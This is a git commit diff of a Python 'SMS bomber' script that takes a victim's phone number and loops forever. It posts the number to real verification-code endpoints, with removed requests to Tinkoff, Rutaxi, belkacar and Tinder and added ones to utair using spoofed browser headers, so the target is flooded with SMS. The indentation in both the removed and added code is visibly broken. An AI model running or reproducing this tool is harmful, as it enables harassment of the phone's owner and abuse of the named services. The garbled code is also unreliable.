9b8666bed679cec6fa392961f06e710ed9bc8d29
Bobsoc <87860555+Bobsoc@users.noreply.github.com>
2021-08-02 08:34:21 +0000

    Add files via upload

--- VityaB00MB.py
+++ VityaB00MB.py
@@ -11,41 +11,15 @@ print ("""
 ────────╔═╝║
 ────────╚══╝""") 
 phone = input("\033[32m Номер Бобика +")
-_name = ''
-for x in range(12):
-        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-    _phone9 = _phone[1:]
-    _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
-    _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
-    _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
-    _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
-    _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
-    s = 3
-iteration = 3
-while True:
-_email = _name+f'{iteration}'+'@gmail.com'
-email = _name+f'{iteration}'+'@gmail.com'
-try:
-	requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
-	print('[+] Tinkoff отправлено красава!')
-except Exception as ex:
-	print('[-] Tinkoff не отправлено лошара!' + str(ex))
-try:	requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'phone': '+'+_phone}, headers={})
-	print('[+] Rutaxi отправлено красава!')
-except Exception as ex:
-	print('[-] Rutaxi не отправлено лошара!' + str(ex))
-try:	requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': '+'+_phone}, headers={})
-	print('[+] belkacar отправлено красава!')
-except Exception as ex:
-	print('[-] belkacar не отправлено лошара!' + str(ex))
-try:	requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone': '+'+_phone}, headers={})
-	print('[+] Тиндер отправлено красава!')
-except Exception as ex:
-	print('[-] Тиндер не отправлено лошара!' + str(ex))
-try:
-iteration += 1
-print(('{} круг пройден.').format(iteration))
-except:
-break
+
+phone = str(phone)
+if (phone[0:2] == "+7" and len(phone[1:]) == 11) or (phone[0:4] == "+380" and len(phone[1:]) == 12):
+	while True: 
+    cl = requests.session()
+    cl.get('https://b.utair.ru/api/v1/login/')
+    rSL = requests.post('https://b.utair.ru/api/v1/login/', headers = {"Content-Type":"application/json", "Referer":"https://www.utair.ru/", "Sec-Fetch-Mode":"cors", "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 OPR/64.0.3417.92 (Edition Yx 02)"}, json={"login":phone[1:]})
+    if rSL.status_code == 200: 
+      print("Сообщение от сервиса utAir отправлено.") 
+    else: 
+      print("Сообщение от сервиса utAir не отправлено.")
+    time.sleep(5) 
